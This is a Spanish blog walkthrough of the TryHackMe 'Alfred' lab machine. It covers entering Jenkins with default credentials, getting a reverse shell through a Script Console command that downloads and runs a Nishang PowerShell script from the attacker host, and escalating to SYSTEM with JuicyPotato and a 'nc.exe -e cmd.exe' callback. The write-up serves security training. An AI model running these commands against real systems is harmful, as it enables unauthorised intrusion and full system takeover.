---
layout: single
title: Máquina Alfred - TryHackMe (OSCP Style) (Offensive Pentesting Path)
excerpt: "La máquina Alfred es una máquina Windows que en TryHackMe piden resolver por medio de Metasploit. Evidentemente lo haremos del modo manual y aprenderemos un par de cosas"
date: 2022-02-05
classes: wide
header:
  teaser: /assets/images/alfred/portada.png
  teaser_home_page: true
categories:
  - THM
  - Blog
tags:
  - Blog
  - Writeup
  - Guía
  - Walkthrough
---

# Información de la máquina
La máquina se encuentra en la plataforma [TryHackMe](https://tryhackme.com/room/alfred) y su resolución se hace por medio de Metasploit completamente. Nosotros vamos a realizarla solo de manera manual, por lo que muchos datos que solicita la página para completar el room no los veremos.

# Reconocimiento
La máquina tiene un sistema operativo Windows, información que nos da TryHackMe. Por medio de un escaneo de puertos con nmap, detectamos aquellos que se encuentren activos con un estatus **open** en la máquina víctima:

	nmap --min-rate 5000 -p- --open -Pn -n 10.10.131.164 -oN portScan

![1]

Vemos que se encuentran habilitados tres puertos: el 80 (HTTP), el 8080 (otro HTTP) y un tercero que es el 3389, el cual no será de relevancia en el room.

Si realizamos un escaneo más exhaustivo en busca de servicios y versiones específicas de dichos puertos, nos encontramos con la siguiente información:

	nmap -sC -sV -p80,3389,8080 10.10.131.164 -oN targeted

![2]

En el caso del primer servidor HTTP, vemos que está corriendo sobre un **IIS**, el servidor web de Windows. Sin embargo, el segundo puerto **HTTP** (8080) corre bajo un software llamado **Jetty**, lo cual nos indica que el sitio web tiene un **Jenkins** también.

# Servicios HTTP
El primer servicio HTTP en el puerto 80 es una página web estática que muestra una imágen de Bruce Wayne (aka Batman) interpretado por Christian Bale en la trilogía de Nolan. Si vemos el código fuente de la página no veremos nada de relevancia, por lo que nos enfocaremos ahora en el segundo servidor HTTP.

![3]

El segundo servidor HTTP en el puerto 8080 muestra un panel de logueo para el servicio **Jenkins**, el cual es un servidor que permite compilar y realizar pruebas de proyectos de manera continua, con el objetivo de integrar cambios y dar nuevas versiones a sus usuarios [(Fuente)](https://sentrio.io/blog/que-es-jenkins/).

![4]

Si buscamos en internet credenciales por defecto para **Jenkins**, veremos que pueden ser algunas de estas:

	admin:password
	admin:
	admin:admin

Por lo tanto, antes de intentar un ataque de fuerza bruta, probamos con esta combinación de credenciales. Afortunadamente, la última es la correcta en este escenario, por lo que ganamos acceso al panel de control del servicio.

![5]

# Acceso por medio de Jenkins
Ya estando dentro del panel de administración de **Jenkins**, podemos ejecutar código en la máquina servidor. Podemos hacerlo de varias formas, pero la que voy a mostrar se basa en mandar un pequeño código con el comando por medio de la herramienta **Script Console**, a la cual se puede acceder desde el menú **Manage Jenkins** de la barra lateral izquierda.

Una vez dentro de esta herramienta, simplemente deberemos introducir un código que nos efectue una acción en específico. Lo primero que debemos hacer es una prueba de que (1) podamos ejecutar código en el sistema y (2) que la máquina servidor tenga comunicación con nuestra máquina de atacante. Para ello, lanzamos una traza **ICMP** por medio de ping a nuestra máquina:

	def cmd_command = "cmd /c ping 10.10.251.43"
	cmd_command.execute()
	
![6]
	
En nuestra máquina de atacante, debemos ponernos en escucha con ayuda de tcpdump por trazas **ICMP**:

	tcpdump -i eth0 icmp
	
![7]

Como podemos obervar, una vez presionamos el botón **Run** en Jenkins, recibiremos las 4 trazas que lanza Windows por defecto a nuestra máquina.

El siguiente paso sería entablar una reverse shell con el sistema remoto, esto lo vamos a realizar con ayuda de los scripts del repositorio [Nishang](https://github.com/samratashok/nishang). Para ello, primero los descargamos por medio de un **git clone** y nos dirigimos al directorio **Shells**.

![8]

Dentro de este directorio nos encontraremos con varios scripts programados en **Powershell**, el que vamos a usar es el que se llama **Invoke-PowerShellTcp.ps1**. Este requiere de una pequeña modificación antes de ser usado, así que lo abrimos con **nano**.

![9]

La línea de código marcada es la instrucción que se ejecutará en la máquina servidor una vez invocado el script, la cual entablará la reverse shell con nosotros. Por lo tanto, deberemos copiarla y pegarla al final de todo el código:

![10]

Evidentemente, deberemos cambiar los parámetros como la IP destino y puerto de conexión. Ahora ya podemos guardar el script.

Lo siguiente es volver a hacer uso de Jenkins para poder ejecutar este script en la máquina servidor, y para ello, colocamos las siguientes sentencias:

	def cmd_command = "cmd /c powershell iex(new-object net.webclient).downloadstring('http://10.10.251.43:8080/Invoke-PowerShellTcp.ps1')"
	cmd_command.execute()

Esto ya lo vimos en la máquina anterior, la [Steel Mountain](https://blu3ming.github.io/maquina-steelmountain-walkthrough/), básicamente le decimos a Powershell que tome un script de manera remota y lo integre en su entorno (¿Recuerdas esa última línea de código que agregamos en el script que nos devolvería la reverse shell? Bueno, una vez sea invocado el script con ese comando, también se entablará la reverse shell). Para que esto funcione, ya debemos tener el script hosteado por un servidor HTTP en Python y una consola con **netcat** en escucha.

![11]

Si ya tenemos todo listo, podemos hacer clic en el botón **Run** y casi de manera inmediata veremos que recibimos la reverse shell en nuestra consola con **netcat**.

![12]

# Enumeración del sistema en busca del privesc
El usuario con el que obtuvimos la consola es **bruce**. Lo primero que hay que hacer es buscar la flag de usuario. Esta se encuentra, como de costumbre, en el directorio **Desktop** del usuario con bajos privilegios con el que obtuvimos la shell.

![13]

Enumeramos ahora los permisos (o mejor dicho privilegios) con los que cuenta nuestro usuario actual:

	whoami /priv
	
![14]

Vemos que el comando nos devuelve varios resultados, pero uno solo es el que debe llamar nuestra atención: **SeImpersonatePrivilege**. Este privilegio es importante ya que mediante este podemos explotar una vulnerabilidad llamada **Windows Token Impersonation**.

# Windows Token Impersonation
Si queremos revisar una explicación más detallada de esta vulnerabilidad podemos leer [este recurso](https://www.exploit-db.com/papers/42556). En resumen, Windows emplea tokens para establecer los permisos que tiene un usuario al momento que este inicia sesión en el sistema (conocidos como tokens de acceso). Estos pueden ser de dos tipos:

1. Primarios
2. De interpretación (impersonation). La traducción al español no es la más apropiada, ya que el término "impersonation" hace referencia a hacerse pasar por alguien más.

Este último es el que nos compete en este caso, ya que permiten a algún proceso en particular poder acceder a recursos del sistema empleando un token de algún otro proceso. Por lo tanto, si nos podemos aprovechar de esto empleando el token de un proceso iniciado por el usuario **Administrator**, entonces podríamos ejecutar acciones privilegiadas "impersonando" su token.

Cabe aclarar que esta vulnerabilidad no está presente en todos los Windows; solo se tiene conocimiento de los siguientes:

- Windows_10_Enterprise
- Windows_10_Pro
- Windows_7_Enterprise
- Windows_8.1_Enterprise
- Windows_Server_2008_R2_Enterprise
- Windows_Server_2012_Datacenter

Y claro, también dependerá de las actualizaciones con las que cuente el sistema. La manera más sencilla de explotar esta vulnerabilidad es con la herramienta **JuicyPotato**. Esta nos permitirá ejecutar el comando que queramos en el sistema sin restricción alguna. Para una explicación más detallada de su uso, puedes revisar [este recurso](https://medium.com/r3d-buck3t/impersonating-privileges-with-juicy-potato-e5896b20d505).

**JuicyPotato** puede ser descargado desde su [repositorio](https://github.com/ohpe/juicy-potato), ya sea como código fuente para ser compilado o ya como binario. Recomiendo esta última, la cual puede descargarse desde el apartado **Fresh Potatoes** del repo en GitHub.

![15]
	
Dado que la herramienta nos permite ejecutar cualquier comando en el sistema, lo que quiero hacer es entablar una reverse shell con ayuda de netcat. Por lo tanto, requiero que tanto **JuicyPotato.exe** como **nc.exe** estén en el servidor remoto. El segundo está presente en cualquier distribución de Linux para pentesting, y puede localizarse con el comando:

	locate nc.exe
	
Para transferirlos a la máquina víctima, establecemos un servidor HTTP con Python y los recibimos en la consola de Powershell con los siguientes comandos:

	(New-Object Net.WebClient).DownloadFile('http://10.10.251.43:8080/JuicyPotato.exe','c:\windows\temp\privesc\JP.exe')
	
Nota: A diferencia de la máquina **Steel Mountain**, esta versión de **Powershell** que corre en el sistema no nos permite elecutar un **Invoke-WebRequest**, por lo que debemos hacerlo de esta otra manera.
	
Nótese cómo se ha creado un directorio en C:\Windows\Temp llamado **Privesc** desde donde realizaremos el proceso de escalada de privilegios. Esto no es necesario, pero recuerda que necesitas de un directorio con permisos de escritura para descargar los binarios.

![16]

Realizamos el mismo procedimiento para el binario de **netcat**:

![17]

Ya con ambos binarios en el sistema, ejecutamos el **JuicyPotato** con el siguiente comando:

	./JP.exe -l 1337 -p c:\windows\system32\cmd.exe -a "/c c:\windows\temp\privesc\nc.exe -e cmd.exe 10.10.251.43 443" -t *
	
Desglosemos este comando:

1. El -l se emplea para indicarle a la herramienta el puerto para el servidor COM que crea JuicyPotato para efectuar el token impersonate. La explicación de qué es un servidor COM escapa de los límites de esta guía.
2. Le sigue el programa o script que ejecutará la herramienta (-p), en este caso, será la CMD de Windows.
3. Este programa no puede ser ejecutado solo, por lo que requiere de argumentos (-a) para realizar una acción específica. En este caso, le decimos que ejecute un comando (/c) que emplee el binario de **netcat** y nos devuelva una reverse shell a la IP y puerto especificados.
4. Por último, el -t le indica cómo crear el proceso, y este puede ser de dos formas: CreateProcessWithToken o CreateProcessAsUser. Para no errarle, siempre elegimos hacerlo de ambas maneras con el comodín *.

Antes de ejecutarlo, ya debemos estar en otra consola a la escucha con **netcat** para recibir la reverse shell. Al ejecutarlo, si vemos que la salida finaliza con un **OK**, significa que la herramienta se ejecutó correctamente.

![18]

Como podemos observar, recibimos la shell como un usuario privilegiado del sistema:

![19]

# Flag de root
Este paso no se pudo completar por varias razones. Primero, el sistema no cuenta con un directorio para el usuario **Administrator**, por lo que la flag no se localiza en este directorio. La misma plataforma de TryHackMe nos dice que la flag se encuentra en esta dirección:

	C:\Windows\System32\config
	
Sin embargo, si nos dirigimos a este directorio no veremos nada.

![20]

Peor aún, si buscamos el archivo en todo el sistema (root.txt), la búsqueda no devolverá resultados:

	dir /s "root.txt"
	
![21]

Quiero suponer que es un error en la máquina que borró el archivo, o incluso el archivo podría aparecer si reinicamos la máquina. No quise seguir intentando esto último, así que con haber comprometido la máquina podemos darla por finalizada.

[1]:/assets/images/alfred/1.png
[2]:/assets/images/alfred/2.png
[3]:/assets/images/alfred/3.png
[4]:/assets/images/alfred/4.png
[5]:/assets/images/alfred/5.png
[6]:/assets/images/alfred/6.png
[7]:/assets/images/alfred/7.png
[8]:/assets/images/alfred/8.png
[9]:/assets/images/alfred/9.png
[10]:/assets/images/alfred/10.png
[11]:/assets/images/alfred/11.png
[12]:/assets/images/alfred/12.png
[13]:/assets/images/alfred/13.png
[14]:/assets/images/alfred/14.png
[15]:/assets/images/alfred/15.png
[16]:/assets/images/alfred/16.png
[17]:/assets/images/alfred/17.png
[18]:/assets/images/alfred/18.png
[19]:/assets/images/alfred/19.png
[20]:/assets/images/alfred/20.png
[21]:/assets/images/alfred/21.png